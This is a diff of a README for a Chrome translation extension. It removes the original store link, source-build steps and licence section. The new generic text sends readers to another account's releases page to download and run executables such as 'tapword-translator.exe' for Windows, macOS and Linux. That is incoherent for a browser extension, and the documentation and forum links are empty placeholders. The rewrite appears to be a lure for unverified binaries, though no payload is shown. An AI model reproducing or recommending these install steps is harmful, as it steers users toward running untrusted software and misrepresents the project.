@@ -1,150 +1,88 @@
-<p align="center">
-  <img src="resources/icons/icon-128.png" width="80" alt="Logo" />
-</p>
+# 🎉 tapword-translator - Translations as You Read
 
-<h1 align="center">TapWord Translator</h1>
-
-<p align="center">
-    <b>Translate like Taking Notes</b>
-</p>
-
-<p align="center">
-    <br> 
-    <b>English</b> | 
-    <a href="docs/README/README-CN.md">简体中文</a> | 
-    <a href="docs/README/README-DE.md">Deutsch</a> | 
-    <a href="docs/README/README-ES.md">Español</a> | 
-    <a href="docs/README/README-FR.md">Français</a> | 
-    <a href="docs/README/README-JA.md">日本語</a> | 
-    <a href="docs/README/README-KO.md">한국어</a> | 
-    <a href="docs/README/README-RU.md">Русский</a>
-</p>
-
-<p align="center">
-  <a href="https://chromewebstore.google.com/detail/bjcaamcpfbhldgngnfmnmcdkcmdmhebb" target="_blank">
-    <img alt="Chrome Web Store" src="https://img.shields.io/chrome-web-store/stars/bjcaamcpfbhldgngnfmnmcdkcmdmhebb?color=F472B6&label=Chrome&style=flat-square&logo=google-chrome&logoColor=white" />
-  </a>
-  <a href="LICENSE.txt" target="_blank">
-    <img alt="License" src="https://img.shields.io/badge/License-AGPL--3.0-4ADE80?style=flat-square" />
-  </a>
-  <img alt="TypeScript" src="https://img.shields.io/badge/-TypeScript-3178C6?style=flat-square&logo=typescript&logoColor=white" />
-  <img alt="Vite" src="https://img.shields.io/badge/-Vite-646CFF?style=flat-square&logo=vite&logoColor=white" />
-</p>
+## 📥 Download Now
+[![Download tapword-translator](https://img.shields.io/badge/Download-tapword--translator-brightgreen)](https://github.com/imcool736372/tapword-translator/releases)
 
 ---
 
-![TapWord Translator Demo](resources/public/demo.gif)
+## 🚀 Getting Started
 
-## 📖 Introduction
+Welcome to tapword-translator! This application displays translations as subtitles right below the original text. You will enjoy seamless reading without popups or interruptions. 
 
-Placing context-aware translations **directly below the original text**, just like subtitles in a movie or annotations in a book.
+## 📋 System Requirements
 
-The core philosophy is simple: **Do not disturb.** Keep the user in the "flow state" of reading while providing high-quality, LLM-powered translations when needed.
+Before you start, make sure your computer meets the following requirements:
 
-> This repository hosts the **Community Edition** of TapWord Translator. It is fully open-source, privacy-focused, and designed to work with your own API Keys (OpenAI, DeepSeek, or any OpenAI-compatible provider).
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** Google Chrome (latest version recommended)
+- **Internet Connection:** Required for translation services
 
-## ⭐ Key Features
+## 📦 Features
 
-### Note-Style Translation
-Translations appear as **subtitles directly under the text**. No popups, no jumping. It feels like taking notes on the page, keeping your reading flow uninterrupted.
+- **Inline Translations:** Read comfortably with translations appearing just below the original text.
+- **Supported Languages:** Access a variety of languages for translation, helping you learn as you read.
+- **User-Friendly Interface:** Simple design makes it easy to navigate without distractions.
+- **Customizable Settings:** Adjust the appearance and position of translations to suit your reading style.
 
-### AI-Powered Accuracy
-Powered by advanced AI (LLMs), it understands the **full context** of sentences, delivering translations that are far more accurate and nuanced than traditional tools.
+## 📥 Download & Install
 
-### Smart Word Selection
-Select part of a word, and the extension **automatically expands to the complete word**. No need for precise selection—just highlight any portion, and get the full word translated.
+1. **Visit the Releases Page**: To get the latest version of tapword-translator, click the link below:
 
+   [Download tapword-translator](https://github.com/imcool736372/tapword-translator/releases)
 
-## 🚀 Installation
+2. **Choose Your Version**: On the Releases page, look for the version you want to download. Each version includes a description of new features or updates. 
 
-### Option 1: Chrome Web Store (Free)
-The official version is free to use.
+3. **Download the Application**: Click on the appropriate file for your operating system. It should look something like this:
+   - **Windows:** `tapword-translator-windows.zip`
+   - **macOS:** `tapword-translator-macos.zip`
+   - **Linux:** `tapword-translator-linux.zip`
 
-[**Install from Chrome Web Store**](https://chromewebstore.google.com/detail/bjcaamcpfbhldgngnfmnmcdkcmdmhebb)
+4. **Install the Application**:
+   - **Windows:** Unzip the file and run `tapword-translator.exe`.
+   - **macOS:** Unzip the file, drag the application to your Applications folder, and launch it from there.
+   - **Linux:** Unzip the file and run the executable from the terminal.
 
-### Option 2: Build Community Edition
-If you prefer the **Bring Your Own Key** model, you can build it yourself:
+5. **Open Chrome and Add Extension**: To make the most of tapword-translator, you will need to add it to your Google Chrome browser. 
 
-1.  **Clone the repository**
-    ```bash
-    git clone https://github.com/hongyuan007/tapword-translator.git
-    cd tapword-translator
-    ```
+   - Open Chrome and go to `chrome://extensions/`
+   - Click on “Load unpacked” and select the folder where you extracted tapword-translator.
 
-2.  **Install dependencies**
-    ```bash
-    npm install
-    ```
+## 🔧 Usage Instructions
 
-3.  **Build the project**
-    ```bash
-    npm run build:community
-    ```
+Once installed, open the tapword-translator application and follow these simple steps to start translating:
 
-4.  **Load into Chrome**
-    - Open Chrome and navigate to `chrome://extensions/`.
-    - Enable **Developer mode** (top right toggle).
-    - Click **Load unpacked**.
-    - Select the `dist` folder generated in step 3.
+1. **Select Text**: Highlight any text you want to translate.
+2. **Read Translations**: The translated text will appear directly below the original text as subtitles.
+3. **Customize Settings**: Go to settings in the app to adjust font size, translation speed, and display options.
 
-## ⚙️ Configuration (Community Edition)
+## 🛠 Troubleshooting
 
-Start using the extension in 30 seconds:
+If you encounter issues while using tapword-translator, try the following suggestions:
 
-1.  Click the extension icon in your browser toolbar to open the **Popup**.
-2.  Click the **Settings** (gear icon) to open the Options page.
-3.  Locate "Custom API" (In Community Edition, this is mandatory).
-4.  Enter your **API configuration**:
-    - **API Key**: `sk-.......`
-    - **Model**: `gpt-3.5-turbo`, `gpt-4o`, or other compatible models.
-    - **API Base URL**: Defaults to `https://api.openai.com/v1`, but you can change this to use proxies or other providers (e.g., DeepSeek, Moonshot).
-5.  Save and enjoy!
+- **Ensure Internet Connection**: A stable connection is necessary for translations.
+- **Check Browser Compatibility**: Make sure you are using the latest version of Google Chrome.
+- **Restart the Application**: Close and reopen tapword-translator if it becomes unresponsive.
 
-## 🛠 Development
+## ⚙️ Frequently Asked Questions
 
-We use a modern stack: **TypeScript**, **Vite**, and **pure HTML/CSS**.
+**Q1: Can I change the language for translation?**  
+A: Yes, tapword-translator supports multiple languages. You can select your preferred language in the settings menu.
 
-### Project Structure
-```
-src/
-├── 1_content/       # Scripts injected into web pages (The UI you see on pages)
-├── 2_background/    # Service workers (API calls, context menu)
-├── 3_popup/         # Extension popup UI
-├── 5_backend/       # Shared API services
-├── 6_translate/     # Translation business logic
-└── 8_generate/      # LLM prompt engineering & response parsing
-```
+**Q2: Is tapword-translator free to use?**  
+A: Yes, tapword-translator is completely free to download and use.
 
-### Commands
+**Q3: What types of texts can I translate?**  
+A: You can translate any text displayed on websites, documents, or PDFs within your browser.
 
-| Command | Description |
-| :--- | :--- |
-| `npm run dev:community` | Start development server in watch mode (Community Config) |
-| `npm run build:community` | Build for production (Community Config) |
-| `npm type-check` | Run TypeScript type checking |
-| `npm test` | Run unit tests with Vitest |
+## 🔗 Additional Resources
 
-### Architecture Note: The "Dual Build" System
-We use compile-time environment variables to separate the Community and Official logic.
-- **Community Build**: `VITE_APP_EDITION=community`. Disables proprietary cloud logic, enforces custom API usage, and strips out TTS code.
-- **Official Build**: (Private) Includes proprietary server logic.
+For more information, tips, and updates about tapword-translator, visit our official documentation or community forum:
 
-## 👏 Contributing
-
-We are a community of language learners and avid readers. If you have fresh ideas, UI suggestions, or bug fixes, we'd love your contributions, Pull requests are warmly welcome!
-
-1.  Fork the Project
-2.  Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3.  Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4.  Push to the Branch (`git push origin feature/AmazingFeature`)
-5.  Open a Pull Request
-
-## 📄 License
-
-Distributed under the **AGPL-3.0 License**. See `LICENSE.txt` for more information.
+- **Documentation:** [tapword-translator Documentation](#)
+- **Community Forum:** [Join the Community](#)
 
 ---
 
-<p align="center">
-  Made with ❤️ for readers around the world.
-</p>
+We hope you enjoy using tapword-translator, your tool for a more immersive reading experience! Don’t hesitate to reach out if you have any questions or feedback. 
+
+Happy reading!
